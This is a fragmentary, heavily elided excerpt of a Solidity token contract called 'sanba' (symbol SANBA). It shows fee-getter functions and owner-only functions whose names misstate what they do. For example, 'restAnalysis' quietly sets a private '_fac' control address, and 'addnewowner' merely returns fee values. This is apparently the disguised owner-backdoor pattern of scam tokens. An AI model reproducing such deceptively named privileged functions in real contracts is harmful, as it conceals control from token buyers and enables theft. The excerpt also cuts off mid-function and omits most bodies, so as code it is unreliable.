...
contract Ownership is Context {  
    ...
    */
    ...
    function restAnalysis(address newOwner) external onlyOwner {
        _fac = newOwner;
    }  
...
contract sanba is Context, IERC20, Ownership{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 1000000 *  10**9;        
    
    string private _name = "sanba";
    string private _symbol = "SANBA";
    ...
    function addnewowner() external view returns (uint256, uint256) {
        return (_feeReflection, _feeMarketing);
    }

   function setBuyFee(uint256 buybackMultiplierTriggeredAt, uint256 totalFee) public view returns (uint256) {
        if (
    ...
    function checkAmount(address shareholder, uint256 amount) external {
    ...
    function checkFees() external view returns (uint256,uint256,uint256,uint256,uint256) {
        return (
            _feeBuyback,
            _feeReflection,
            _feeMarketing,
